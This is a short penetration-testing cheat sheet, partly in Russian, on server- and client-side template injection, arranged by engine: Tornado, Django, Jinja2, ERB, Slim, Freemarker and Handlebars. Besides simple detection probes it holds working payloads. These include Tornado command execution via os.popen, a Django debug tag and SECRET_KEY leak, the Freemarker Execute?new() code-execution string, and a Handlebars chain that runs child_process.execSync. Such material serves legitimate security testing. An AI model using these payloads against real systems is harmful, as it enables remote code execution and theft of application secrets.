# SSTI/CSTI

Flask & Jinja2 [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

Template Injection Workshop (по сути, примеры, как это работает в python, php, java,..): [https://gosecure.github.io/template-injection-workshop/#0](https://gosecure.github.io/template-injection-workshop/#0)

Норм описание для h1 для CSTI: [https://hackerone.com/reports/125027](https://hackerone.com/reports/125027)

## Python

### Tornado

Link: [https://www.tornadoweb.org/en/stable/](https://www.tornadoweb.org/en/stable/)

Basic:

```python
{{ 2*2 }}
{% raw %}
{% import subprocess %}
{% import os %}
{% endraw %}{{ os.popen("whoami").read() }}
```

### Django

#### Django Templates

Link:[ https://docs.djangoproject.com/en/4.1/topics/templates/](https://docs.djangoproject.com/en/4.1/topics/templates/)

Basic:

```python
{% raw %}
{% debug %}
{% endraw %}
{{ setting.SECRET_KEY }}
```

### Jinja2

Link: [https://jinja.palletsprojects.com/en/3.1.x/](https://jinja.palletsprojects.com/en/3.1.x/)

## Ruby

### ERB

Link: [https://puppet.com/docs/puppet/5.5/lang\_template\_erb.html](https://puppet.com/docs/puppet/5.5/lang\_template\_erb.html)

Basic:

```ruby
<%= 7 * 7 %>
```

### Slim

Link: [https://github.com/slim-template/slim](https://github.com/slim-template/slim)

Basic:

```ruby
#{ 7 * 7 }
```

## Java

### Freemarker

Link:[ https://try.freemarker.apache.org/](https://try.freemarker.apache.org/)

Basic:

```java
// Code Execution — id:
${"freemarker.template.utility.Execute"?new()("id")}
```

В коде: [https://habr.com/ru/post/420549/](https://habr.com/ru/post/420549/)

Создаем модель данных:

```java
import freemarker.template.Configuration;
import freemarker.template.Template;
...
// Конфигурация
Configuration cfg = new Configuration(Configuration.VERSION_2_3_27);
// модель данных
Map<String, Object> root = new HashMap<>();
root.put("name", "Freemarker");
// шаблон
Template temp = cfg.getTemplate("test.ftl");
// обработка шаблона и модели данных
Writer out = new OutputStreamWriter(System.out);
// вывод в консоль
temp.process(root, out);
```

Spring поддерживает работу с этим шаблонизатором.

Через класс `freemarker.template.TemplateMethodModelEx` можно расширять команды в шаблонизаторе.

## JavaScript

### Handlebars

Link: [https://handlebarsjs.com/](https://handlebarsjs.com/)

Basic:

```javascript
${{7*7}} -> OK
${{7*'7'}} -> Empty
```

RCE (from [payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars)):

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
